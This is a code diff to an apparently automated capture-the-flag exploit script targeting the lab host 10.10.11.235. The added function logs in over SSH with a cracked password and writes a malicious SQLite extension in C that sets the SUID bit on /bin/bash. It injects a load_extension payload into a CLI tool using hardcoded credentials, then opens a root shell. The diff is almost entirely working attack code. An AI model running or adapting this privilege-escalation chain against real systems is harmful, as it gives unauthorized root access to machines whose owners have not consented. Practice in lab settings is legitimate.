@@ -100,6 +100,8 @@ def DownloadZip(username, passZip):
 
 	stdin, stdout, stderr = client.exec_command('python3 -m http.server 8080 --directory /var/www/backups')
 
+	time.sleep(2)
+
 	subprocess.Popen(["wget", "http://10.10.11.235:8080/1_Nov_db_backup.sqlite3.7z"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 	time.sleep(1)
@@ -118,6 +120,46 @@ def CrackPass():
 		password_2 = file.read()
 
 	return	re.findall(":(.*)",password_2)[0]
+
+def Doodle(username,password_2):
+	ssh_command = f"ssh {username}@10.10.11.235"
+
+	ssh_session = pexpect.spawn(ssh_command, timeout=None)
+
+	ssh_session.expect('password:')
+
+	ssh_session.sendline(password_2)
+
+	ssh_session.sendline('export TERM=xterm')
+
+	ssh_session.sendline('echo -e "#include <stdlib.h>\\n void sqlite3_extension_init() {\\n\\tsetuid(0);\\n\\tsetgid(0);\\n\\tsystem(\\"/usr/bin/chmod u+s /bin/bash\\");\\n}" > test.c')
+
+	ssh_session.sendline(' gcc test.c -shared -fPIC -o a')
+
+	ssh_session.sendline('./doodleGrive-cli')
+
+	ssh_session.sendline('moriarty')
+
+	ssh_session.sendline('findMeIfY0uC@nMr.Holmz!')
+
+	ssh_session.sendline('5')
+
+	ssh_session.sendline('"+load_extension(char(46,47,97))+"')
+
+	time.sleep(1)
+
+	ssh_session.sendline('6')
+
+	time.sleep(1)
+
+	ssh_session.sendline('bash -p')
+
+	ssh_session.sendline('clear')
+
+
+	ssh_session.interact()
+
+
 
 if __name__ == "__main__":
 
@@ -147,5 +189,7 @@ if __name__ == "__main__":
 
 	password_2 = CrackPass()
 
+	os.system("rm 1_* db* hash*")
 
+	Doodle('tom', password_2)
 
